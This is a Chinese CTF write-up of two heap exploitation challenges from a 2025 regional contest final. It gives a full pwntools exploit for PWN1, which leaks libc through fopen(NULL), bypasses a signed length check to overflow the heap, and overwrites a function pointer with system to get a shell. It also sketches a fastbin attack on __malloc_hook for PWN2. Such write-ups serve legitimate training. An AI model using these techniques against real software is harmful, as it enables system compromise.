---
title: 津京冀网络攻防大赛线下决赛pwn–全场唯一解
contest: 津京冀网络攻防大赛决赛
year: 2025
difficulty: medium
vuln_type: heap_exploit
tags: [堆溢出, 有符号比较绕过, fopen NULL, unsorted bin leak, fastbin attack, libc2.23]
attack_chain: pwn1:fopen(NULL)获取FILE结构libc地址→add两次0x40堆→edit用极大值(0x7fffffff00000000+0x80)触发堆溢出覆盖chunk1 size位→show(1)泄main_arena+88→改chunk1函数指针为system+写/bin/sh→pwn2:UAF+fastbin attack→fake chunk在stdout(bss段)→show泄libc→改__malloc_hook为one_gadget
key_payload: "edit new_length=0x7fffffff00000000+0x80;libc=main_arena+88-0x3EC680;libc+0x4F440=system;pwn2:fake chunk at 0x60201d;__malloc_hook=one_gadget[0x4527a,0xf03a4,0xf1247]"
one_liner: 津京冀决赛pwn1+pwn2全场唯一解：fopen(NULL) FILE结构泄漏+有符号比较堆溢出+fastbin attack stdout
lesson: 堆题中edit长度校验有符号比较用极大数绕过；fopen(NULL)FILE结构含libc指针可泄漏
quality: high
---

# 津京冀网络攻防大赛线下决赛pwn–全场唯一解

**赛事**：津京冀网络攻防大赛线下决赛

**PWN1（堆题，全场唯一解）**：
- IDA去符号表
- 蜜汁函数：fopen(NULL) → 创建NULL文件描述符，FILE结构放在堆上（**含libc地址！**）
- 仅能创建2次堆块，无UAF
- add函数：先malloc结构体（u未用、memset函数指针、chunk数据）
- **漏洞点**：edit防止溢出检查 `&chunk[n] < chunk` 是有符号比较
  - 极大n → 负数 → 绕过检查
  - `(unsigned int)` 转换高位+低位组合
- **EXP**：
  ```python
  io.sendlineafter(b'> ', b'2')  # add
  io.sendlineafter(b'role name:', b'0xa6')
  io.sendlineafter(b'length:', str(0x40).encode())
  
  # 第二次add
  io.sendlineafter(b'> ', b'2')
  io.sendlineafter(b'role name:', b'0xa6')
  io.sendlineafter(b'length:', str(0x40).encode())
  io.sendlineafter(b'description:', b'why??')
  
  # edit触发堆溢出
  io.sendlineafter(b'> ', b'4')
  io.sendlineafter(b'new length:', str(0x7fffffff00000000 + 0x80).encode())
  payload = b'a'*0x48 + p64(0x41) + b'a'*0x28 + p64(0x1000)
  io.sendafter(b'description:', payload)
  
  # show(1)泄libc
  io.sendlineafter(b'> ', b'1')
  libc = u64(io.recv(8)) - 0x3EC680
  
  # 改chunk1函数指针为system + 写/bin/sh
  io.sendlineafter(b'> ', b'4')
  payload = b'a'*0x48 + p64(0x41) + b'a'*0x20 + p64(libc + 0x4F440)
  io.sendafter(b'description:', '/bin/sh\x00')
  io.sendline(b'cat flag')
  ```

**PWN2（libc 2.23 UAF）**：
- UAF + fastbin attack
- got表不可写 → fake chunk放在bss段stdout处
- show泄libc
- 改__malloc_hook为one_gadget
- ogg数组：`[0x4527a, 0xf03a4, 0xf1247]`

**关键技术**：
- fopen(NULL) FILE结构包含libc地址
- 有符号比较用极大值绕过
- fastbin attack fake chunk在bss段stdout
- IDA MCP辅助 + GDB MCP

**质量评估**：高（EXP完整 + 唯一解）
